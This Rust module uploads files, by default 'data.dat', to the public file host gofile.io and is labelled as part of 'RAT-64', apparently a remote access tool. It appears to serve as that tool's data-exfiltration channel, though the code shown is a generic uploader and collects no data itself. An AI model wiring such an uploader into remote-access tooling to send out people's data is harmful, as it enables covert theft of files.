//! GoFile Upload System for RAT-64
//! 
//! # 使用例
//! 
//! ## 認証なし（新規公開フォルダ）
//! ```rust
//! use rat_64::file_uploader::*;
//! 
//! let up = Uploader::new().with_best_server()?;
//! let out = up.upload("data.dat")?;
//! println!("Download URL: {:?}", out.download_page);
//! ```
//! 
//! ## 認証＋フォルダ指定（東京リージョン指定）
//! ```rust
//! use rat_64::file_uploader::*;
//! 
//! let up = Uploader::new()
//!     .token(std::env::var("GOFILE_TOKEN")?)
//!     .folder_id("XXXX-YYYY")
//!     .upload_url("https://upload-ap-tyo.gofile.io/uploadfile");
//! let out = up.upload("data.dat")?;
//! ```

use std::{fmt, path::Path};

#[derive(Debug)]
pub enum UploadError {
    Io(std::io::Error),
    Network(String),
    Json(String),
    Disabled(&'static str),
}

impl From<std::io::Error> for UploadError {
    fn from(e: std::io::Error) -> Self { Self::Io(e) }
}

#[cfg(feature = "network")]
impl From<minreq::Error> for UploadError {
    fn from(e: minreq::Error) -> Self { Self::Network(e.to_string()) }
}

impl fmt::Display for UploadError {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Io(e) => write!(f, "IO: {e}"),
            Self::Network(e) => write!(f, "Network: {e}"),
            Self::Json(e) => write!(f, "JSON: {e}"),
            Self::Disabled(msg) => write!(f, "{msg}"),
        }
    }
}
impl std::error::Error for UploadError {}

/// アップロード結果（URLは両方とれる場合あり）
#[derive(Debug, Clone)]
pub struct UploadResult {
    pub status_code: i32,
    pub download_page: Option<String>,
    pub direct_link: Option<String>,
    pub raw: String,
}

#[derive(Debug, Clone)]
pub struct Uploader {
    token: Option<String>,
    folder_id: Option<String>,
    upload_url: String,
    timeout_secs: u64,
}

impl Default for Uploader {
    fn default() -> Self {
        Self {
            token: None,
            folder_id: None,
            upload_url: "https://upload.gofile.io/uploadfile".to_string(),
            timeout_secs: 30,
        }
    }
}

impl Uploader {
    pub fn new() -> Self {
        Self { token: Some("".to_string()), ..Default::default() }
    }

    pub fn token(mut self, token: impl Into<String>) -> Self {
        self.token = Some(token.into());
        self
    }

    pub fn folder_id(mut self, folder_id: impl Into<String>) -> Self {
        self.folder_id = Some(folder_id.into());
        self
    }

    pub fn upload_url(mut self, url: impl Into<String>) -> Self {
        self.upload_url = url.into();
        self
    }

    pub fn timeout(mut self, secs: u64) -> Self {
        self.timeout_secs = secs;
        self
    }

    /// GoFileの推奨サーバーを取得して設定（失敗時はデフォルトサーバーを使用）
    #[cfg(feature = "network")]
    pub fn with_best_server(mut self) -> Result<Self, UploadError> {
        // サーバー情報取得を試行（失敗してもエラーにしない）
        if let Ok(resp) = minreq::get("https://api.gofile.io/getServer")
            .with_timeout((self.timeout_secs as i32).try_into().unwrap())
            .send() 
        {
            if let Ok(text) = resp.as_str() {
                if let Ok(v) = serde_json::from_str::<serde_json::Value>(text) {
                    if v.get("status").and_then(|s| s.as_str()) == Some("ok") {
                        if let Some(server) = v.pointer("/data/server").and_then(|s| s.as_str()) {
                            // 推奨サーバーが取得できた場合
                            self.upload_url = format!("https://{server}.gofile.io/uploadFile");
                            return Ok(self);
                        }
                    }
                }
            }
        }
        
        println!("⚠️  GoFile server discovery failed; using default {}", self.upload_url);
        Ok(self)
    }

    #[cfg(not(feature = "network"))]
    pub fn with_best_server(self) -> Result<Self, UploadError> {
        Err(UploadError::Disabled("Network feature not enabled"))
    }

    /// 単一ファイルをアップロード
    pub fn upload<P: AsRef<Path>>(&self, file_path: P) -> Result<UploadResult, UploadError> {
        #[cfg(feature = "network")]
        {
            use std::fs;

            let file_path = file_path.as_ref();
            let file_name = file_path
                .file_name()
                .and_then(|s| s.to_str())
                .unwrap_or("upload.bin");
            let file_bytes = fs::read(file_path)?;

            // multipart 組み立て
            let boundary = "----minreqBoundary_9b7e4d8db7a84e1f";
            let body = build_multipart(boundary, MultipartSpec {
                token: self.token.as_deref(),
                folder_id: self.folder_id.as_deref(),
                file_field_name: "file",
                file_name,
                file_bytes: &file_bytes,
            });

            // リクエスト
            let mut req = minreq::post(&self.upload_url)
                .with_header(
                    "Content-Type",
                    format!("multipart/form-data; boundary={boundary}"),
                )
                .with_timeout((self.timeout_secs as i32).try_into().unwrap())
                .with_body(body);

            // v2 API は Bearer を好むが、フォームの token でも通る環境あり
            if let Some(t) = &self.token {
                // Authorization はあっても害はない
                req = req.with_header("Authorization", format!("Bearer {t}"));
            }

            let resp = req.send()?;
            let status = resp.status_code;
            let raw = resp.as_str().unwrap_or("").to_string();

            // JSON を素直に読む（v1/v2の差異を吸収）
            let v: serde_json::Value =
                serde_json::from_str(&raw).map_err(|e| UploadError::Json(format!("{e}: {raw}")))?;

            match v.get("status").and_then(|s| s.as_str()) {
                Some("ok") => {}
                Some("error") | Some("fail") | None => {
                    let msg = v.pointer("/data/message")
                        .or_else(|| v.pointer("/data/error"))
                        .or_else(|| v.pointer("/message"))
                        .and_then(|s| s.as_str())
                        .unwrap_or("Unknown error");
                    return Err(UploadError::Network(format!("GoFile API error: {msg}; body={raw}")));
                }
                _ => {}
            }


            match v.get("status").and_then(|s| s.as_str()) {
                Some("ok") => {} // 続行
                Some("error") | Some("fail") | None => {
                    let msg = v.pointer("/data/message")
                        .or_else(|| v.pointer("/data/error"))
                        .or_else(|| v.pointer("/message"))
                        .and_then(|s| s.as_str())
                        .unwrap_or("Unknown error");
                    return Err(UploadError::Network(format!("GoFile API error: {msg}; body={raw}")));
                }
                _ => {}
            }

            let mut page = v.pointer("/data/downloadPage").and_then(|s| s.as_str()).map(str::to_string);
            let direct = v.pointer("/data/directLink").and_then(|s| s.as_str()).map(str::to_string);
            if page.is_none() {
                if let Some(code) = v.pointer("/data/code").and_then(|s| s.as_str()) {
                    page = Some(format!("https://gofile.io/d/{code}"));
                }
            }

            if status != 200 {
                return Err(UploadError::Network(format!("HTTP {status}: {raw}")));
            }
            Ok(UploadResult {
                status_code: status,
                download_page: page,
                direct_link: direct,
                raw,
            })
        }
        #[cfg(not(feature = "network"))]
        {
            let _ = file_path;
            Err(UploadError::Disabled("Upload requires 'network' feature"))
        }
    }

    /// まとめて上げる（失敗も個別に返す）
    pub fn upload_batch<P: AsRef<Path>>(&self, paths: &[P]) -> Vec<Result<UploadResult, UploadError>> {
        paths.iter().map(|p| self.upload(p)).collect()
    }
}

/// multipartの材料
struct MultipartSpec<'a> {
    token: Option<&'a str>,
    folder_id: Option<&'a str>,
    file_field_name: &'a str,
    file_name: &'a str,
    file_bytes: &'a [u8],
}

/// 共通 multipart 組み立て
fn build_multipart(boundary: &str, spec: MultipartSpec<'_>) -> Vec<u8> {
    let mut body = Vec::<u8>::new();

    if let Some(token) = spec.token {
        push_text_field(&mut body, boundary, "token", token);
    }
    if let Some(fid) = spec.folder_id {
        push_text_field(&mut body, boundary, "folderId", fid);
    }
    // file
    body.extend_from_slice(
        format!(
            "--{boundary}\r\n\
             Content-Disposition: form-data; name=\"{}\"; filename=\"{}\"\r\n\
             Content-Type: application/octet-stream\r\n\r\n",
            spec.file_field_name, spec.file_name
        )
        .as_bytes(),
    );
    body.extend_from_slice(spec.file_bytes);
    body.extend_from_slice(b"\r\n");
    // 終端
    body.extend_from_slice(format!("--{boundary}--\r\n").as_bytes());

    body
}

fn push_text_field(dst: &mut Vec<u8>, boundary: &str, name: &str, value: &str) {
    dst.extend_from_slice(
        format!(
            "--{boundary}\r\n\
             Content-Disposition: form-data; name=\"{name}\"\r\n\r\n\
             {value}\r\n"
        )
        .as_bytes(),
    );
}

// ==============================================================
// rat_64.exe 互換性のための便利関数
// ==============================================================

/// 互換性のための便利関数：data.datファイルを自動検出してアップロード
pub fn upload_data_file() -> Result<String, UploadError> {
    let data_path = "data.dat";
    
    if !Path::new(data_path).exists() {
        return Err(UploadError::Io(std::io::Error::new(
            std::io::ErrorKind::NotFound,
            "data.dat file not found"
        )));
    }
    
    #[cfg(feature = "network")]
    {
        let uploader = Uploader::new().with_best_server().unwrap_or_default();
        let result = uploader.upload(data_path)?;
        
        if let Some(download_page) = result.download_page {
            Ok(format!("✓ Upload successful!\nDownload URL: {}", download_page))
        } else {
            Ok(format!("Upload successful: {}", result.raw))
        }
    }
    
    #[cfg(not(feature = "network"))]
    {
        Err(UploadError::Disabled("Upload requires 'network' feature"))
    }
}

/// 互換性のための便利関数：複数ファイルをアップロード
pub fn upload_multiple<P: AsRef<Path>>(file_paths: &[P]) -> Vec<Result<String, UploadError>> {
    #[cfg(feature = "network")]
    {
        let uploader = if let Ok(t) = std::env::var("GOFILE_TOKEN") {
        Uploader::new().token(t).with_best_server().unwrap_or_default()
    } else {
        Uploader::new().with_best_server().unwrap_or_default()
    };
        file_paths.iter()
            .map(|path| {
                let result = uploader.upload(path)?;
                if let Some(download_page) = result.download_page {
                    Ok(format!("✓ Upload successful!\nDownload URL: {}", download_page))
                } else {
                    Ok(format!("Upload successful: {}", result.raw))
                }
            })
            .collect()
    }
    
    #[cfg(not(feature = "network"))]
    {
        let _ = file_paths;
        vec![Err(UploadError::Disabled("Upload requires 'network' feature")); file_paths.len()]
    }
}